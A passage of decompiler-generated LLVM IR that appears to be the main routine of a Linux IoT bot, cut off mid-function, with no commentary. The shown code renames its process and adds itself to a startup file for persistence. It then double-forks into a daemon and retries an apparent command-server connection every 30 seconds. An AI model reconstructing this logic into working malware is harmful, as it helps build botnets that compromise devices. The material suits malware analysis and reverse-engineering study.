  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp123 = call i32 @__decompiler_undefined_function_0()
  %tmp126 = call i8* @__decompiler_undefined_function_2()
  %tmp135 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i8*, align 4
  %stack_var_-5872 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804cc5d = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804cc5d, i32* %stack_var_-24, align 4
  %v5_804cc6e = icmp ult i32* %stack_var_-24, inttoptr (i32 5848 to i32*)
  store i1 %v5_804cc6e, i1* %cf.global-to-local, align 1
  store i32 %v2_804cc5d, i32* %edx.global-to-local, align 4
  %v1_804cc87 = add i32 %v2_804cc5d, 4
  %v2_804cc87 = inttoptr i32 %v1_804cc87 to i32*
  %v3_804cc87 = load i32, i32* %v2_804cc87, align 4
  store i32 %v3_804cc87, i32* %eax.global-to-local, align 4
  %v1_804cc8a = inttoptr i32 %v3_804cc87 to i32*
  %v2_804cc8a = load i32, i32* %v1_804cc8a, align 4
  %v1_804cc97 = and i32 %v2_804cc8a, -256
  store i32 %v1_804cc97, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804cc9a = inttoptr i32 %v2_804cc8a to i8*
  store i32 %v2_804cc8a, i32* @edi, align 4
  %v3_804cca0 = call i32 @_strlen(i8* %v4_804cc9a)
  %v4_804cca0 = mul i32 %v3_804cca0, -1
  %v1_804cca4 = sub i32 1, %v4_804cca0
  store i32 %v1_804cca4, i32* %eax.global-to-local, align 4
  %v1_804cca6 = sub i32 0, %v4_804cca0
  store i32 %v1_804cca6, i32* %edx.global-to-local, align 4
  %v3_804ccaf = load i32, i32* %v2_804cc87, align 4
  store i32 %v3_804ccaf, i32* %eax.global-to-local, align 4
  %v1_804ccb2 = inttoptr i32 %v3_804ccaf to i32*
  %v2_804ccb2 = load i32, i32* %v1_804ccb2, align 4
  store i32 %v2_804ccb2, i32* %eax.global-to-local, align 4
  %v0_804ccb4 = load i32, i32* @esp, align 4
  %v5_804ccb4 = icmp ult i32 %v0_804ccb4, 4
  store i1 %v5_804ccb4, i1* %cf.global-to-local, align 1
  %v5_804ccbd = inttoptr i32 %v2_804ccb2 to i8*
  store i8* %v5_804ccbd, i8** %stack_var_-5888, align 4
  %v5_804ccbe = call i32 @strncpy(i8* %v5_804ccbd, i32 ptrtoint (i32* @global_var_80566ec.172 to i32), i32 %v1_804cca6)
  store i32 %v5_804ccbe, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80566ec.172 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804cc5d, i32* @esi, align 4
  %v3_804ccd1 = load i32, i32* %v2_804cc87, align 4
  %v2_804ccd4 = inttoptr i32 %v3_804ccd1 to i32*
  store i32 ptrtoint (i32* @global_var_80566ec.172 to i32), i32* %v2_804ccd4, align 4
  store i32 ptrtoint (i32* @global_var_80566ec.172 to i32), i32* %eax.global-to-local, align 4
  %v0_804ccd9 = load i32, i32* @esp, align 4
  %v5_804ccd9 = icmp ult i32 %v0_804ccd9, 12
  store i1 %v5_804ccd9, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v6_804cce5 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_80566ec.172 to i32), i32 0, i32 0, i32 0)
  store i32 %v6_804cce5, i32* %eax.global-to-local, align 4
  %v5_804cced = icmp ult i32* %stack_var_-5872, inttoptr (i32 12 to i32*)
  store i1 %v5_804cced, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804ccf2 = call i32 @__GI_time(i32* null)
  store i32 %v3_804ccf2, i32* %eax.global-to-local, align 4
  %v0_804ccf7 = load i32, i32* @esp, align 4
  %v2_804ccf7 = icmp ugt i32 %v0_804ccf7, -17
  store i1 %v2_804ccf7, i1* %cf.global-to-local, align 1
  store i32 %v3_804ccf2, i32* @ebx, align 4
  %v0_804ccfc = call i32 @__libc_getpid()
  %v1_804cd01 = load i32, i32* @ebx, align 4
  %v2_804cd01 = xor i32 %v1_804cd01, %v0_804ccfc
  store i32 %v2_804cd01, i32* @eax, align 4
  %v0_804cd03 = load i32, i32* @esp, align 4
  %v5_804cd03 = icmp ult i32 %v0_804cd03, 12
  store i1 %v5_804cd03, i1* %cf.global-to-local, align 1
  %v5_804cd06 = inttoptr i32 %v2_804cd01 to i8*
  store i8* %v5_804cd06, i8** %stack_var_-5888, align 4
  %v2_804cd07 = call i32 @srand(i32 %v2_804cd01)
  store i32 %v2_804cd07, i32* %eax.global-to-local, align 4
  store i1 %v5_804cced, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804cd14 = call i32 @__GI_time(i32* null)
  store i32 %v3_804cd14, i32* %eax.global-to-local, align 4
  %v0_804cd19 = load i32, i32* @esp, align 4
  %v2_804cd19 = icmp ugt i32 %v0_804cd19, -17
  store i1 %v2_804cd19, i1* %cf.global-to-local, align 1
  store i32 %v3_804cd14, i32* @ebx, align 4
  %v0_804cd1e = call i32 @__libc_getpid()
  %v1_804cd23 = load i32, i32* @ebx, align 4
  %v2_804cd23 = xor i32 %v1_804cd23, %v0_804cd1e
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804cd23, i32* %eax.global-to-local, align 4
  %v1_804cd26 = call i32 @init_rand(i32 %v2_804cd23)
  store i32 %v1_804cd26, i32* @eax, align 4
  %v5_804cd3c = icmp ult i32* %stack_var_-5872, inttoptr (i32 8 to i32*)
  store i1 %v5_804cd3c, i1* %cf.global-to-local, align 1
  %tmp182 = bitcast i8** %stack_var_-5888 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_80566ed.173 to i32), i32* %tmp182, align 4
  %v3_804cd47 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_80566ed.173 to i32), i32 ptrtoint (i32* @global_var_8056700.174 to i32))
  store i32 %v3_804cd47, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cd52 = icmp eq i32 %v3_804cd47, 0
  %v1_804cd56 = icmp eq i1 %v4_804cd52, false
  br i1 %v1_804cd56, label %dec_label_pc_804cd75, label %dec_label_pc_804cd58

dec_label_pc_804cd58:                             ; preds = %entry
  store i1 %v5_804cd3c, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8056702.175 to i32), i32* %tmp182, align 4
  %v3_804cd6a = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_8056702.175 to i32), i32 ptrtoint (i32* @global_var_8056700.174 to i32))
  store i32 %v3_804cd6a, i32* %eax.global-to-local, align 4
  %v0_804cd6f = load i32, i32* @esp, align 4
  %v2_804cd6f = icmp ugt i32 %v0_804cd6f, -17
  store i1 %v2_804cd6f, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cd75

dec_label_pc_804cd75:                             ; preds = %entry, %dec_label_pc_804cd58
  %stack_var_-88.0 = phi i32 [ %v3_804cd47, %entry ], [ %v3_804cd6a, %dec_label_pc_804cd58 ]
  %v3_804cec513 = phi i32 [ ptrtoint ([19 x i8]* @global_var_80566ed.173 to i32), %entry ], [ ptrtoint ([13 x i8]* @global_var_8056702.175 to i32), %dec_label_pc_804cd58 ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cd75 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804cd75, label %dec_label_pc_804cf1c, label %dec_label_pc_804cd7f

dec_label_pc_804cd7f:                             ; preds = %dec_label_pc_804cd75
  %v3_804cd85 = load i32, i32* %v2_804cc87, align 4
  store i32 %v3_804cd85, i32* %eax.global-to-local, align 4
  %v1_804cd88 = inttoptr i32 %v3_804cd85 to i32*
  %v2_804cd88 = load i32, i32* %v1_804cd88, align 4
  %v1_804cd95 = and i32 %v2_804cd88, -256
  store i32 %v1_804cd95, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804cd98 = inttoptr i32 %v2_804cd88 to i8*
  store i32 %v2_804cd88, i32* @edi, align 4
  %v3_804cd9e = call i32 @_strlen(i8* %v4_804cd98)
  %v0_804cdaf = load i32, i32* @esp, align 4
  %v5_804cdaf = icmp ult i32 %v0_804cdaf, 8
  store i1 %v5_804cdaf, i1* %cf.global-to-local, align 1
  %v2_804cdb7 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804cdb7, i32* %eax.global-to-local, align 4
  %tmp183 = bitcast i32* %stack_var_-368 to i8*
  store i8* %tmp183, i8** %stack_var_-5888, align 4
  %v3_804cdbe = call i32 @getcwd(i32 %v2_804cdb7, i32 256)
  %v0_804cdc3 = load i32, i32* @esp, align 4
  %v2_804cdc3 = icmp ugt i32 %v0_804cdc3, -17
  store i1 %v2_804cdc3, i1* %cf.global-to-local, align 1
  store i32 %v2_804cdb7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_804cdb7, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_805670f.176 to i32), i32* @edi, align 4
  %v7_804cdf9 = call i32 @_strncmp(i8* %tmp183, i8* bitcast (i8** @global_var_805670f.176 to i8*), i32 2)
  %v8_804cdf9 = urem i32 %v7_804cdf9, 2
  %v9_804cdf9 = icmp eq i32 %v8_804cdf9, 0
  %v0_804cdfb = load i1, i1* %cf.global-to-local, align 1
  %v2_804cdfb = or i1 %v0_804cdfb, %v9_804cdf9
  %v3_804cdfb = zext i1 %v2_804cdfb to i32
  %v4_804cdfb = load i32, i32* @edx, align 4
  %v5_804cdfb = and i32 %v4_804cdfb, -256
  %v6_804cdfb = or i32 %v3_804cdfb, %v5_804cdfb
  %v7_804cdfb = xor i32 %v6_804cdfb, 1
  store i32 %v7_804cdfb, i32* %edx.global-to-local, align 4
  %v5_804cdfe = ptrtoint i32* %stack_var_-512 to i32
  %v3_804ce01 = and i32 %v7_804cdf9, -256
  %v1_804ce03 = trunc i32 %v7_804cdfb to i8
  %v3_804ce03 = trunc i32 %v5_804cdfe to i8
  %v4_804ce03 = sub i8 %v1_804ce03, %v3_804ce03
  %v15_804ce03 = icmp eq i8 %v4_804ce03, 0
  %v20_804ce03 = zext i8 %v4_804ce03 to i32
  %v23_804ce03 = or i32 %v20_804ce03, %v3_804ce01
  store i32 %v23_804ce03, i32* @ecx, align 4
  %v2_804ce07 = sext i8 %v4_804ce03 to i32
  store i32 %v2_804ce07, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804ce03, label %dec_label_pc_804cf0e, label %dec_label_pc_804ce17.preheader

dec_label_pc_804ce17.preheader:                   ; preds = %dec_label_pc_804cd7f
  br label %dec_label_pc_804ce17

dec_label_pc_804ce14:                             ; preds = %dec_label_pc_804ce17
  %v4_804ce14 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804ce17

dec_label_pc_804ce17:                             ; preds = %dec_label_pc_804ce17.preheader, %dec_label_pc_804ce14
  %stack_var_-84.0 = phi i32 [ %v4_804ce14, %dec_label_pc_804ce14 ], [ %v3_804cd9e, %dec_label_pc_804ce17.preheader ]
  store i32 %v2_804cc5d, i32* @esi, align 4
  %v3_804ce1d = load i32, i32* %v2_804cc87, align 4
  store i32 %v3_804ce1d, i32* %eax.global-to-local, align 4
  %v1_804ce20 = inttoptr i32 %v3_804ce1d to i32*
  %v2_804ce20 = load i32, i32* %v1_804ce20, align 4
  store i32 %v2_804ce20, i32* %edx.global-to-local, align 4
  %v2_804ce25 = add i32 %v2_804ce20, %stack_var_-84.0
  store i32 %v2_804ce25, i32* %eax.global-to-local, align 4
  %v1_804ce28 = inttoptr i32 %v2_804ce25 to i8*
  %v2_804ce28 = load i8, i8* %v1_804ce28, align 1
  %v3_804ce28 = zext i8 %v2_804ce28 to i32
  %v5_804ce28 = and i32 %v2_804ce25, -256
  %v6_804ce28 = or i32 %v3_804ce28, %v5_804ce28
  store i32 %v6_804ce28, i32* %eax.global-to-local, align 4
  %v6_804ce2a = icmp ult i8 %v2_804ce28, 47
  store i1 %v6_804ce2a, i1* %cf.global-to-local, align 1
  %v10_804ce2a = icmp eq i8 %v2_804ce28, 47
  %v1_804ce2c = icmp eq i1 %v10_804ce2a, false
  br i1 %v1_804ce2c, label %dec_label_pc_804ce14, label %dec_label_pc_804ce2e

dec_label_pc_804ce2e:                             ; preds = %dec_label_pc_804ce17
  store i32 %v2_804cc5d, i32* @edi, align 4
  %v3_804ce34 = load i32, i32* %v2_804cc87, align 4
  store i32 %v3_804ce34, i32* %eax.global-to-local, align 4
  %v1_804ce37 = inttoptr i32 %v3_804ce34 to i32*
  %v2_804ce37 = load i32, i32* %v1_804ce37, align 4
  store i32 %v2_804ce37, i32* %edx.global-to-local, align 4
  %v2_804ce3c = add i32 %v2_804ce37, %stack_var_-84.0
  %v2_804ce4c = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804ce4c, i32* %eax.global-to-local, align 4
  %tmp184 = bitcast i32* %stack_var_-624 to i8*
  store i8* %tmp184, i8** %stack_var_-5888, align 4
  %v5_804ce53 = call i32 @sprintf(i32 %v2_804ce4c, i32 ptrtoint ([8 x i8]* @global_var_8056711.177 to i32), i32 %v2_804cdb7, i32 %v2_804ce3c)
  store i32 %v5_804ce53, i32* %eax.global-to-local, align 4
  %v0_804ce58 = load i32, i32* @esp, align 4
  %v2_804ce58 = icmp ugt i32 %v0_804ce58, -17
  store i1 %v2_804ce58, i1* %cf.global-to-local, align 1
  %v8_804ce9a = inttoptr i32 %stack_var_-88.0 to i8*
  %tmp185 = inttoptr i32 %stack_var_-88.0 to i32*
  %v2_804ce68 = ptrtoint i32* %stack_var_-1648 to i32
  %tmp186 = bitcast i32* %stack_var_-1648 to i8*
  %v5_804ce5d = icmp ult i32* %stack_var_-5872, inttoptr (i32 4 to i32*)
  br label %dec_label_pc_804ce97.outer

dec_label_pc_804ce5d:                             ; preds = %dec_label_pc_804ce97
  store i1 %v5_804ce5d, i1* %cf.global-to-local, align 1
  store i32 %v2_804ce68, i32* %eax.global-to-local, align 4
  store i8* %tmp186, i8** %stack_var_-5888, align 4
  %v4_804ce6f = call i32 @fgets(i32 %v2_804ce68, i32 1024, i32 %stack_var_-88.0)
  store i1 %v5_804cd3c, i1* %cf.global-to-local, align 1
  store i32 %v2_804ce68, i32* %eax.global-to-local, align 4
  store i8* %tmp186, i8** %stack_var_-5888, align 4
  %v4_804ce88 = call i32 @__GI_strcasecmp(i8* %tmp186, i32 %v2_804ce4c)
  store i32 %v4_804ce88, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ce90 = icmp eq i32 %v4_804ce88, 0
  %v1_804ce92 = icmp eq i1 %v1_804ce90, false
  br i1 %v1_804ce92, label %dec_label_pc_804ce97, label %dec_label_pc_804ce94

dec_label_pc_804ce94:                             ; preds = %dec_label_pc_804ce5d
  %v4_804ce94 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804ce97.outer

dec_label_pc_804ce97.outer:                       ; preds = %dec_label_pc_804ce94, %dec_label_pc_804ce2e
  %stack_var_-80.0.ph = phi i32 [ %v4_804ce94, %dec_label_pc_804ce94 ], [ 0, %dec_label_pc_804ce2e ]
  br label %dec_label_pc_804ce97

dec_label_pc_804ce97:                             ; preds = %dec_label_pc_804ce97.outer, %dec_label_pc_804ce5d
  store i1 %v5_804cced, i1* %cf.global-to-local, align 1
  store i8* %v8_804ce9a, i8** %stack_var_-5888, align 4
  %v3_804ce9d = call i32 @feof(i32* %tmp185)
  store i32 %v3_804ce9d, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cea5 = icmp eq i32 %v3_804ce9d, 0
  br i1 %v1_804cea5, label %dec_label_pc_804ce5d, label %dec_label_pc_804cea9

dec_label_pc_804cea9:                             ; preds = %dec_label_pc_804ce97
  %v4_804cea9 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804cead = icmp eq i1 %v4_804cea9, false
  store i1 %v5_804cced, i1* %cf.global-to-local, align 1
  store i8* %v8_804ce9a, i8** %stack_var_-5888, align 4
  %tmp187 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804cf04 = call i32 @__GI_fclose(i16* %tmp187)
  store i32 %v3_804cf04, i32* @eax, align 4
  %v0_804cf09 = load i32, i32* @esp, align 4
  %v2_804cf09 = icmp ugt i32 %v0_804cf09, -17
  store i1 %v2_804cf09, i1* %cf.global-to-local, align 1
  br i1 %v1_804cead, label %dec_label_pc_804cf1c, label %dec_label_pc_804ceaf

dec_label_pc_804ceaf:                             ; preds = %dec_label_pc_804cea9
  store i1 %v5_804cd3c, i1* %cf.global-to-local, align 1
  store i32 %v3_804cec513, i32* %tmp182, align 4
  %v3_804cec8 = call i32 @__GI_fopen(i32 %v3_804cec513, i32 ptrtoint (i32* @global_var_8056719.178 to i32))
  store i32 %v3_804cec8, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ced3 = icmp eq i32 %v3_804cec8, 0
  br i1 %v4_804ced3, label %dec_label_pc_804cf1c, label %dec_label_pc_804ced9

dec_label_pc_804ced9:                             ; preds = %dec_label_pc_804ceaf
  store i1 %v5_804cd3c, i1* %cf.global-to-local, align 1
  store i32 %v2_804ce4c, i32* %eax.global-to-local, align 4
  store i8* %tmp184, i8** %stack_var_-5888, align 4
  %v3_804cee6 = call i32 @__GI_fputs(i32 %v2_804ce4c, i32 %v3_804cec8)
  store i32 %v3_804cee6, i32* @eax, align 4
  store i1 %v5_804cced, i1* %cf.global-to-local, align 1
  %v8_804cef1 = inttoptr i32 %v3_804cec8 to i8*
  store i8* %v8_804cef1, i8** %stack_var_-5888, align 4
  %tmp188 = inttoptr i32 %v3_804cec8 to i16*
  %v3_804cef4 = call i32 @__GI_fclose(i16* %tmp188)
  store i32 %v3_804cef4, i32* %eax.global-to-local, align 4
  %v0_804cef9 = load i32, i32* @esp, align 4
  %v2_804cef9 = icmp ugt i32 %v0_804cef9, -17
  store i1 %v2_804cef9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf1c

dec_label_pc_804cf0e:                             ; preds = %dec_label_pc_804cd7f
  %v0_804cf0e = load i32, i32* @esp, align 4
  %v5_804cf0e = icmp ult i32 %v0_804cf0e, 12
  store i1 %v5_804cf0e, i1* %cf.global-to-local, align 1
  %v8_804cf11 = inttoptr i32 %stack_var_-88.0 to i8*
  store i8* %v8_804cf11, i8** %stack_var_-5888, align 4
  %tmp189 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804cf14 = call i32 @__GI_fclose(i16* %tmp189)
  store i32 %v3_804cf14, i32* %eax.global-to-local, align 4
  %v0_804cf19 = load i32, i32* @esp, align 4
  %v2_804cf19 = icmp ugt i32 %v0_804cf19, -17
  store i1 %v2_804cf19, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf1c

dec_label_pc_804cf1c:                             ; preds = %dec_label_pc_804cea9, %dec_label_pc_804ceaf, %dec_label_pc_804cd75, %dec_label_pc_804ced9, %dec_label_pc_804cf0e
  %v0_804cf1c = call i32 @getOurIP()
  store i32 %v0_804cf1c, i32* %eax.global-to-local, align 4
  %v0_804cf21 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cf21 = ptrtoint i8* %v0_804cf21 to i32
  %v2_804cf21 = call i32 @__libc_fork(i32 %v1_804cf21)
  store i32 %v2_804cf21, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cf29 = icmp eq i32 %v2_804cf21, 0
  br i1 %v4_804cf29, label %dec_label_pc_804cf53, label %dec_label_pc_804cf84

dec_label_pc_804cf53:                             ; preds = %dec_label_pc_804cf1c
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804cf53 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cf53 = ptrtoint i8* %v0_804cf53 to i32
  %v2_804cf53 = call i32 @__libc_fork(i32 %v1_804cf53)
  store i32 %v2_804cf53, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cf5b = icmp eq i32 %v2_804cf53, 0
  br i1 %v4_804cf5b, label %dec_label_pc_804cf6b.thread, label %dec_label_pc_804cf71

dec_label_pc_804cf6b.thread:                      ; preds = %dec_label_pc_804cf53
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf95

dec_label_pc_804cf71:                             ; preds = %dec_label_pc_804cf53
  %v0_804cf61 = load i32, i32* @esp, align 4
  %v5_804cf61 = icmp ult i32 %v0_804cf61, 12
  store i1 %v5_804cf61, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804cf66 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_805671b.179 to i32), i32* %eax.global-to-local, align 4
  %v0_804cf76 = load i32, i32* @esp, align 4
  %v5_804cf76 = icmp ult i32 %v0_804cf76, 12
  store i1 %v5_804cf76, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805671b.179, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804cf7a = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_805671b.179 to i32))
  store i32 %v2_804cf7a, i32* %eax.global-to-local, align 4
  %v0_804cf7f = load i32, i32* @esp, align 4
  %v2_804cf7f = icmp ugt i32 %v0_804cf7f, -17
  store i1 %v2_804cf7f, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf95

dec_label_pc_804cf84:                             ; preds = %dec_label_pc_804cf1c
  %v0_804cf2f = load i32, i32* @esp, align 4
  %v5_804cf2f = icmp ult i32 %v0_804cf2f, 4
  store i1 %v5_804cf2f, i1* %cf.global-to-local, align 1
  %v2_804cf34 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_804cf34, i32* %eax.global-to-local, align 4
  %v8_804cf38 = inttoptr i32 %v2_804cf21 to i8*
  store i8* %v8_804cf38, i8** %stack_var_-5888, align 4
  %v4_804cf3b = call i32 @__libc_waitpid(i32 %v2_804cf21, i32 %v2_804cf34, i32 0)
  store i32 %v4_804cf3b, i32* @eax, align 4
  store i1 %v5_804cced, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804cf48 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_805671b.179 to i32), i32* %eax.global-to-local, align 4
  %v0_804cf89 = load i32, i32* @esp, align 4
  %v5_804cf89 = icmp ult i32 %v0_804cf89, 12
  store i1 %v5_804cf89, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805671b.179, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804cf8d = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_805671b.179 to i32))
  store i32 %v2_804cf8d, i32* %eax.global-to-local, align 4
  %v0_804cf92 = load i32, i32* @esp, align 4
  %v2_804cf92 = icmp ugt i32 %v0_804cf92, -17
  store i1 %v2_804cf92, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf95

dec_label_pc_804cf95:                             ; preds = %dec_label_pc_804cf6b.thread, %dec_label_pc_804cf71, %dec_label_pc_804cf84
  %v0_804cf95 = call i32 @__GI_setsid()
  store i32 %v0_804cf95, i32* %eax.global-to-local, align 4
  %v0_804cf9a = load i32, i32* @esp, align 4
  %v5_804cf9a = icmp ult i32 %v0_804cf9a, 12
  store i1 %v5_804cf9a, i1* %cf.global-to-local, align 1
  store i8* bitcast (i8** @global_var_805670f.176 to i8*), i8** %stack_var_-5888, align 4
  %v2_804cfa2 = call i32 @chdir(i32 ptrtoint (i8** @global_var_805670f.176 to i32))
  store i32 %v2_804cfa2, i32* %eax.global-to-local, align 4
  store i1 %v5_804cd3c, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5888, align 4
  %v3_804cfb1 = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_804cfb1, i32* %eax.global-to-local, align 4
  %v0_804cfb6 = load i32, i32* @esp, align 4
  %v2_804cfb6 = icmp ugt i32 %v0_804cfb6, -17
  store i1 %v2_804cfb6, i1* %cf.global-to-local, align 1
  %v2_804d673 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp190 = bitcast i32* %stack_var_-5744 to i8*
  %tmp191 = bitcast i8** %stack_var_-36 to i32*
  %v2_804d62a = ptrtoint i32* %stack_var_-624 to i32
  %v2_804d466 = ptrtoint i32* %stack_var_-1648 to i32
  %v5_804d2d9 = and i32 %v2_804d673, -256
  %v1_804d2e6 = or i32 %v2_804d673, 1
  %storemerge16209 = inttoptr i32 %v1_804d2e6 to i8*
  br label %dec_label_pc_804cfbb.outer

dec_label_pc_804cfbb.outer:                       ; preds = %dec_label_pc_804d2a5, %dec_label_pc_804d673, %dec_label_pc_804cf95
  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_804cf95 ], [ %stack_var_-28.1.ph, %dec_label_pc_804d673 ], [ %stack_var_-28.1.ph, %dec_label_pc_804d2a5 ]
  %stack_var_-5832.0.ph = phi i32 [ %tmp123, %dec_label_pc_804cf95 ], [ %stack_var_-5832.2.ph27, %dec_label_pc_804d673 ], [ %stack_var_-5832.2.ph27, %dec_label_pc_804d2a5 ]
  %stack_var_-64.0.ph = phi i8* [ %tmp126, %dec_label_pc_804cf95 ], [ %stack_var_-64.2.ph32, %dec_label_pc_804d673 ], [ %stack_var_-64.2.ph32, %dec_label_pc_804d2a5 ]
  %stack_var_-60.0.ph36 = phi i32 [ %tmp135, %dec_label_pc_804cf95 ], [ %stack_var_-60.3, %dec_label_pc_804d673 ], [ %stack_var_-60.2, %dec_label_pc_804d2a5 ]
  %stack_var_-96.0.ph37 = phi i32 [ 0, %dec_label_pc_804cf95 ], [ %stack_var_-96.2.ph34, %dec_label_pc_804d673 ], [ %v4_804d2a5, %dec_label_pc_804d2a5 ]
  %v0_804cfbb55 = call i32 @initConnection()
  store i32 %v0_804cfbb55, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cfc056 = icmp eq i32 %v0_804cfbb55, 0
  br i1 %v1_804cfc056, label %dec_label_pc_804cfd3, label %dec_label_pc_804cfc4

dec_label_pc_804cfc4:                             ; preds = %dec_label_pc_804cfbb.outer, %dec_label_pc_804cfc4
  %v0_804cfc4 = load i32, i32* @esp, align 4
  %v5_804cfc4 = icmp ult i32 %v0_804cfc4, 12
  store i1 %v5_804cfc4, i1* %cf.global-to-local, align 1
  %v1_804cfc7 = add i32 %v0_804cfc4, -16
  %v2_804cfc7 = inttoptr i32 %v1_804cfc7 to i32*
  store i32 30, i32* %v2_804cfc7, align 4
  %v0_804cfc9 = call i32 @sleep()
  store i32 %v0_804cfc9, i32* %eax.global-to-local, align 4
  %v0_804cfce = load i32, i32* @esp, align 4
  %v2_804cfce = icmp ugt i32 %v0_804cfce, -17
  store i1 %v2_804cfce, i1* %cf.global-to-local, align 1
  %v0_804cfbb = call i32 @initConnection()
  store i32 %v0_804cfbb, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cfc0 = icmp eq i32 %v0_804cfbb, 0
  br i1 %v1_804cfc0, label %dec_label_pc_804cfd3, label %dec_label_pc_804cfc4

dec_label_pc_804cfd3:                             ; preds = %dec_label_pc_804cfc4, %dec_label_pc_804cfbb.outer
  %v0_804cfd3 = call i32 @getBuild()
  store i32 %v0_804cfd3, i32* %eax.global-to-local, align 4
  store i32 %v0_804cfd3, i32* @ebx, align 4
  %v0_804cfda = load i32, i32* @esp, align 4
  %v5_804cfda = icmp ult i32 %v0_804cfda, 12
  store i1 %v5_804cfda, i1* %cf.global-to-local, align 1
  %v0_804cfdd = load i32, i32* @global_var_805fd88.41, align 8
  %v2_804cfdd = add i32 %v0_804cfda, -16
  %v3_804cfdd = inttoptr i32 %v2_804cfdd to i32*
  store i32 %v0_804cfdd, i32* %v3_804cfdd, align 4
  %v0_804cfe3 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cfe3 = ptrtoint i8* %v0_804cfe3 to i32
  %v2_804cfe3 = call i32 @__GI_inet_ntoa(i32 %v1_804cfe3)
  store i32 %v2_804cfe3, i32* %eax.global-to-local, align 4
  %v0_804cfe8 = load i32, i32* @esp, align 4
  %v2_804cfe8 = icmp ugt i32 %v0_804cfe8, -17
  store i1 %v2_804cfe8, i1* %cf.global-to-local, align 1
  %v0_804cfeb = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804cfeb, i32* %edx.global-to-local, align 4
  %v0_804cff1 = load i32, i32* @ebx, align 4
  %v2_804cff1 = add i32 %v0_804cfe8, 12
  %v3_804cff1 = inttoptr i32 %v2_804cff1 to i32*
  store i32 %v0_804cff1, i32* %v3_804cff1, align 4
  %v2_804cff2 = add i32 %v0_804cfe8, 8
  %v3_804cff2 = inttoptr i32 %v2_804cff2 to i32*
  store i32 %v2_804cfe3, i32* %v3_804cff2, align 4
  %v1_804cff3 = add i32 %v0_804cfe8, 4
  %v2_804cff3 = inttoptr i32 %v1_804cff3 to i32*
